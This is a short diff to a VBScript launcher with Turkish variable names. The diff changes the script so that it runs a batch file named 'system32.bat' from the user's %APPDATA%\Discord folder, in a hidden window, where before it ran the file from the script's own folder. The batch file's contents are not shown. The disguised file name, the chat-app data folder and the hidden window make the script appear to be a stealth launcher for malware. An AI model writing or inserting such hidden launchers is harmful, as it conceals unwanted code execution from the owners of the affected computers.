@@ -1,5 +1,5 @@
 Set WshShell = CreateObject("WScript.Shell")
-Dim klasor
-klasor = CreateObject("Scripting.FileSystemObject").GetParentFolderName(WScript.ScriptFullName)
-WshShell.Run """" & klasor & "\system32.bat""", 0, False
+Dim yol
+yol = WshShell.ExpandEnvironmentStrings("%APPDATA%\Discord")
+WshShell.Run """" & yol & "\system32.bat""", 0, False
 Set WshShell = Nothing
